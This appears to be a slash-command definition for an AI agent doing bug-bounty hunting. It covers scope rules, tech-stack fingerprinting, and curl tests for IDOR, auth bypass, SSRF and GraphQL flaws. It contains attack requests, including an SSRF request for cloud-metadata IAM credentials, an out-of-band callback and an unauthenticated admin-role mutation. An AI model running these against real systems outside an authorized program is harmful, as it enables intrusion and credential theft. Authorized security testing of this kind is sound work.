---
description: Start hunting on a target — loads scope, reads disclosed reports, picks best attack surface based on tech stack, runs targeted vuln checks. Usage: /hunt target.com [--vuln-class ssrf|idor|xss|sqli|oauth|race|graphql|llm|upload|business-logic]
tui: opencode
---

# /hunt

Active vulnerability hunting on a target.

## What This Does

1. Reads program scope (in-scope assets, exclusions, payment behavior)
2. Loads recon output from `recon/<target>/` if available
3. Detects tech stack and maps to primary bug classes
4. Runs targeted tests for the highest-ROI bug classes
5. Documents findings with exact HTTP requests

## Usage

```
/hunt target.com
/hunt target.com --vuln-class idor          # focus on one bug class (lower tokens, faster)
/hunt target.com --vuln-class ssrf
/hunt target.com --vuln-class graphql
/hunt target.com --source-code ./repo       # static analysis + live testing
/hunt target.com --browser                  # browser-based testing (OAuth/SSO/SPA flows)
/hunt targets.txt                           # multi-target: one domain per line
```

## Session Isolation

**One session per target.** The model accumulates context — testing two targets in one session
causes cross-contamination where payloads, assumptions, and findings from target A
affect target B.

Open a separate session/window for each target.

## Multi-Target

Create a `targets.txt` with one domain per line:
```
api.target.com
app.target.com
admin.target.com
```
Then: `/hunt targets.txt --vuln-class idor`

Each target runs independently. Findings scoped per-target in hunt memory.

## Source Code Mode (--source-code)

```
/hunt target.com --source-code ./path/to/repo
```

Enables:
- Hardcoded secrets and API key grep
- Route-to-controller mapping — find endpoints with missing auth decorators
- Dangerous function scan: eval, exec, unserialize, raw SQL concat
- Cross-reference source findings with live endpoint scan
- Persistent per-repo ledger under `docs/vulnerabilities/` (team-owned repos only): read it first to skip already-known findings and flag regressions, write each confirmed finding back so devs and future scans do not repeat the same bug. Format and rules: `rules/source-audit.md` section 11.

## Browser Mode (--browser)

When a browser automation tool is available, use `--browser` for:
- OAuth / SSO / 2FA flows that require JavaScript
- DOM-based XSS (invisible to curl probes)
- WebSocket endpoints
- SPA route discovery (React/Vue/Angular)
- Real file upload and form submission

## Phase 0: Pre-Hunt Setup

### MCP Browser Detection

Before hunting, check which tools are available:

```
If a browser MCP or browser automation tool is available:
  USE IT FOR: account creation (CAPTCHA/email-verify flows), OAuth consent screens,
              JS-heavy auth, XSS proof-of-execution in browser
  DO NOT USE FOR: any standard HTTP request you can do with curl or fetch
  REASON: browser MCP adds 500ms-5s per request vs ~50ms for curl

Default: curl / fetch for all HTTP testing. Browser MCP is last resort only.
```

### Scope Lock

**Before making any request, the scope must be locked.**

```
1. Extract the exact in-scope list from the program page
2. Extract the exact out-of-scope list
3. Load it into ScopeChecker (tools/scope_checker.py) if running automated tests
4. If an asset is NOT on the in-scope list → it does not exist for this hunt
5. If an asset IS on the out-of-scope list → hard stop, do not proceed
```

Scope creep = bans + instant-close reports. Wildcard `*.target.com` does NOT cover:
- `target.com` itself (must be listed separately)
- `sub.sub.target.com` (unless program confirms multi-level wildcards)
- `target-cdn.otherdomain.com` (different root domain)
- Third-party services even if CNAME points there (Zendesk, Salesforce, etc.)

## Phase 1: Read Before Touching (15 min)

### Read Program Scope
```
1. Go to program page (HackerOne/Bugcrowd/Intigriti)
2. Note ALL in-scope domains — only test these, nothing else
3. Note ALL out-of-scope domains — never test these (Vienna: /advuew/* excluded!)
4. Note impact types accepted (some exclude "low" severity)
5. Check average bounty — signals program generosity
6. Write down the scope list — refer back before every new host you touch
```

### Read Disclosed Reports (Intel)
```bash
# HackerOne Hacktivity for this program:
# https://hackerone.com/TARGET_NAME/hacktivity

# Search by bug class:
# https://hackerone.com/hacktivity?querystring=TARGET_NAME+IDOR
# https://hackerone.com/hacktivity?querystring=TARGET_NAME+SSRF

# Extract from each report:
# 1. Which endpoint
# 2. Which bug class
# 3. What parameter
# 4. What check was missing
# 5. What they paid
```

## Phase 2: Tech Stack Detection (2 min)

```bash
TARGET="target.com"

curl -sI https://$TARGET | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"

# Stack → Primary bug class:
# Ruby on Rails  → mass assignment, IDOR
# Django         → IDOR (ModelViewSet), SSTI
# Flask          → SSTI (render_template_string), SSRF
# Laravel        → mass assignment, IDOR
# Express/Node   → prototype pollution, path traversal
# Spring Boot    → Actuator endpoints, SSTI
# Next.js        → SSRF via Server Actions, open redirect
# GraphQL        → introspection, IDOR via node(), auth bypass on mutations
```

## Phase 3: Active Testing

### IDOR Testing (highest ROI)

```bash
# Setup: create two accounts (attacker + victim)
# Log in as attacker, perform actions, note all IDs in requests
# Replay with attacker's token but victim's IDs

# Test HTTP method variations:
# If GET /api/user/123/orders is protected:
curl -X DELETE https://target.com/api/user/123/orders \
  -H "Authorization: Bearer ATTACKER_TOKEN"

# Test API version differences:
# Protected: /api/v2/user/123/data
# Try: /api/v1/user/123/data (older version, may lack auth)

# Test GraphQL node():
# {"query": "{ node(id: \"dXNlcjoy\") { ... on User { email phone } } }"}
```

### Auth Bypass Testing

```bash
# Check all siblings — if 9 have auth, find the 1 that doesn't:
for endpoint in export delete share archive download restore transfer admin; do
  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" \
    "https://target.com/api/users/123/$endpoint" \
    -H "Authorization: Bearer ATTACKER_TOKEN"
done

# Remove auth entirely:
curl -s "https://target.com/api/users/123/profile"  # no auth header
```

### SSRF Testing

```bash
# Find URL parameters in recon output
cat recon/$TARGET/ssrf-candidates.txt | head -20

# Test with cloud metadata
# Use interactsh for OOB confirmation:
interactsh-client &
INTERACT_URL="http://$(interactsh-client --poll)"

# Test payloads:
curl "https://target.com/api/image?url=$INTERACT_URL"
curl "https://target.com/api/webhook" -d "{\"url\": \"$INTERACT_URL\"}"

# If DNS callback confirmed → escalate to internal:
curl "https://target.com/api/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### GraphQL Testing

```bash
# Introspection check
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# If introspection on → enumerate mutations
# Look for: createUser, deletePost, updateRole, assignAdmin

# Test auth bypass on mutations:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
# Without auth header — does it work?
```

## Phase 4: The A→B Signal Method

When you confirm bug A, immediately check for B and C:

| Found A | Check B | Check C |
|---|---|---|
| IDOR on GET | IDOR on PUT/DELETE same path | IDOR on sibling endpoints |
| Auth bypass on endpoint | Every sibling in same controller | Old API version |
| Stored XSS | Does admin view it? (priv esc) | Email/export/PDF rendering |
| SSRF DNS callback | Internal services (169.254.x.x) | SSRF via open redirect |
| S3 listing | JS bundles → grep secrets | .env files in bucket |
| OAuth no PKCE | CSRF on OAuth flow | Auth code reuse |
| Race on coupons | Race on credits/wallet | Race on rate limits |

**3 rules before pursuing B:**
1. Confirm A is real first (exact HTTP request + response)
2. B must be a DIFFERENT bug (different endpoint OR mechanism OR impact)
3. B must pass Gate 0 independently

## Phase 5: Document Findings

Create `targets/<target>/SESSION.md`:

```markdown
# TARGET: target.com | DATE: [today] | CROWN JEWEL: [what attacker wants most]

## Active Leads
- [14:22] /api/v2/invoices/{id} — no ownership check visible. Testing...
- [14:35] User-Agent reflected in error — checking if stored

## Dead Ends (don't revisit)
- /admin → IP restricted. Hard stop.

## Anomalies
- GET /api/export → 200 even without session cookie

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} — read+write from attacker session
```

## 20-Minute Rotation Rule

Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln class.
**Fresh context finds more bugs than brute force.**

## Source Code Mode (`--source-code`)

When a repo is available, follow this methodology. See `rules/source-audit.md` for full details.

### Phase 1: Risk Map (2 min)
Classify every file before touching code:
```
CRITICAL: auth/, payment/, admin/, crypto/
HIGH: routes/, controllers/, api/, db/, sessions/
MEDIUM: services/, utils/, middleware/
SKIP: tests/, mocks/, *.spec.*, __tests__/
```

Recently modified files (last 30 days) = elevated priority regardless of tier.

### Phase 2: Trust Boundary Sweep (5 min)
Identify every point where external input enters:
```
- HTTP routes / REST handlers → req.body, req.params, req.query
- GraphQL resolvers → args.*
- File upload handlers → multer/formidable fields
- WebSocket message handlers → event.data
- Queue/event consumers → message.body
```

### Phase 3: Trace Input → Sink
For each trust boundary, trace the data flow to every sink:
```
Dangerous sinks: db.execute(), exec(), eval(), os.system(),
                 dangerouslySetInnerHTML, render_template_string,
                 readFile(), path.join() with user input,
                 pickle.loads(), YAML.load(), JSON.parse with reviver
```

If no sink reachable from that boundary → no bug. Move on.

### Phase 4: Adversarial Challenge (5 min per finding)
Before reporting, try to DISPROVE:
```
1. Is there validation I missed earlier in the call chain?
2. Does an ORM/framework already prevent this?
3. Is the code actually reachable? (not dead code)
4. Is output escaped at the render layer even if not at input?
5. Does the language runtime prevent exploitation?
```

### Calibration

| Pattern | Finding Type | Report? |
|---------|-------------|---------|
| `db.execute(f"SELECT ... {user_input}")` | SQLi — raw string | YES |
| `prisma.user.findFirst({ where: { email: input } })` | ORM — parameterized | NO (FP) |
| `os.system(f"convert {filename}")` | CMDi — shell=True | YES |
| `subprocess.run(["convert", filename])` | List args — no shell | NO (FP) |
| `res.json(doc)` with no ownership check | IDOR | YES |
| `Order.findOne({ id: id, userId: req.user.id })` | Ownership in query | NO (FP) |

## Getting Specific Results (Anti-Vague Rule)

If the model gives a generic message like "try testing for XSS" or "check for IDOR",
that is not useful. Demand specificity:

```
Give me the EXACT curl command to test endpoint X.
Include: full URL, exact headers (including auth token placeholder), exact body.
Do not describe what to do -- show the command.
```

The agent should ALWAYS respond with runnable commands, not descriptions.
If it doesn't, add: "Show commands only. No prose."

## Auto-Memory (runs at session end)

When the hunt session ends, run `/remember` to log a summary to hunt memory so `/pickup` picks it up next time.

## Stop Signals (move on if you see these)

- 403 no matter what you try
- 20+ payload variations, identical response
- Finding needs 5+ simultaneous preconditions
- 30+ min on same endpoint with no progress
